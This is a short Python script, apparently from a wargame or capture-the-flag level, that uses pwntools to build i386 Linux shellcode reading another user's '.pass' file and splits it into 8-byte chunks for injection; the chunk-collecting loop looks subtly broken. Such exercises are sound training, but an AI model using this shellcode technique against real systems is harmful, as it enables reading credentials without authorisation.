import pwn

shell = pwn.shellcraft.i386.linux.cat('/home/users/level07/.pass').split('\n')
size = 0
add = b''
for line in shell:
	asm = pwn.asm(line)
	if (size + len(asm) > 8):
		print(size, '|', add)
		add = b''
		size = 0
	size += len(asm)
